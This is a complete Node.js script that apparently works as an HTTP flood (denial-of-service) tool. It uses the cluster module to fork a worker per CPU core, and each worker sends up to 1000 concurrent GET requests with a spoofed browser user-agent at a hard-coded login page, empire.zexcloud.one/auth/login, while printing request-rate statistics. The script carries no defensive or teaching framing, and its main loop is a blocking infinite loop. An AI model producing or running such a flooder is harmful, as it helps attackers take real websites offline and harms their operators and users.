const http = require('http');
const https = require('https');
const url = require('url');
const cluster = require('cluster');
const os = require('os');
const { performance } = require('perf_hooks');

const TARGET_URL = 'https://empire.zexcloud.one/auth/login';  // Target URL
const MAX_CONCURRENT_REQUESTS = 1000;  // Max concurrent requests per worker

// Tracking metrics
let totalRequests = 0;
let activeRequests = 0;
let startTime = performance.now();

// Number of CPU cores
const numCores = os.cpus().length;

if (cluster.isMaster) {
    // Fork workers for each CPU core
    console.log(`Master process is running on PID ${process.pid}. Forking workers...`);
    
    for (let i = 0; i < numCores; i++) {
        cluster.fork();
    }

    // Monitor workers
    cluster.on('online', (worker) => {
        console.log(`Worker ${worker.process.pid} is online`);
    });

    cluster.on('exit', (worker, code, signal) => {
        console.log(`Worker ${worker.process.pid} died with code ${code}`);
    });
} else {
    // Worker process: Flood the target with requests
    function makeRequest() {
        const parsedUrl = url.parse(TARGET_URL);
        const protocol = parsedUrl.protocol === 'https:' ? https : http;

        const options = {
            hostname: parsedUrl.hostname,
            port: parsedUrl.port || (protocol === https ? 443 : 80),
            path: parsedUrl.path,
            method: 'GET',
            headers: {
                'Connection': 'keep-alive',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
        };

        const req = protocol.request(options, (res) => {
            res.on('data', () => {}); // Ignore the response body
            res.on('end', () => {
                activeRequests--;
                totalRequests++;
                checkConcurrency();
            });
        });

        req.on('error', (e) => {
            activeRequests--;
            checkConcurrency();
        });

        req.end();
    }

    // Ensure max concurrency per worker
    function checkConcurrency() {
        if (activeRequests < MAX_CONCURRENT_REQUESTS) {
            const remainingRequests = MAX_CONCURRENT_REQUESTS - activeRequests;
            for (let i = 0; i < remainingRequests; i++) {
                activeRequests++;
                makeRequest();
            }
        }
    }

    // Function to display stats
    function displayStats() {
        const elapsedTime = (performance.now() - startTime) / 1000;  // Time in seconds
        const rps = totalRequests / elapsedTime;

        console.clear();
        console.log(`Requests per second: ${rps.toFixed(2)}`);
        console.log(`Total Requests: ${totalRequests}`);
        console.log(`Active Requests: ${activeRequests}`);
        console.log(`Elapsed Time: ${elapsedTime.toFixed(2)} seconds`);
    }

    // Main loop for the worker process to keep flooding
    function startFlood() {
        setInterval(() => {
            displayStats();
        }, 1000);  // Update stats every second

        while (true) {
            makeRequest();
            activeRequests++;
        }
    }

    startFlood();
}
